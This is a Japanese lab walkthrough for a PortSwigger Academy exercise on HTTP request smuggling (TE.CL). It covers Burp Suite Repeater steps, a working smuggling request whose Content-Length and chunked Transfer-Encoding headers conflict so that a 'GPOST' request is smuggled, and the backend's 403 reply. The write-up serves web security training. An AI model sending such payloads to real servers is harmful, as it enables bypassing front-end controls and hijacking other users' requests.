# HTTP リクエストの密輸、基本的な TE.CL の脆弱性

以下のハッキングラボを実施します  
https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl  
このラボにはフロントエンド サーバーとバックエンド サーバーが含まれますが、バックエンド サーバーはチャンク エンコーディングをサポートしていません。フロントエンド サーバーは、GET メソッドまたは POST メソッドを使用しないリクエストを拒否します。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. GET / リクエストを send to repeater します
- 4. Repeater のリクエストを表示した状態で右クリックして change to request を選択して、POST リクエストに切り替えます

* 5. Setting で Repeater の Update content length のチェックボックスを外します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/8b1031a6-e20f-4f61-b906-8b54d6d8a882)

* 6. リクエストを以下のように書き換えて 2 回送信します

```
POST / HTTP/1.1
Host: 0a98006704a74a8b8537d6020056004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

2 回目のレスポンスがバックエンドから返されます

```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

フロントエンドは chunked により、92 文字のペイロードを受け取り、バックエンドは Content-length: 4 の GPOST を受け取ります。
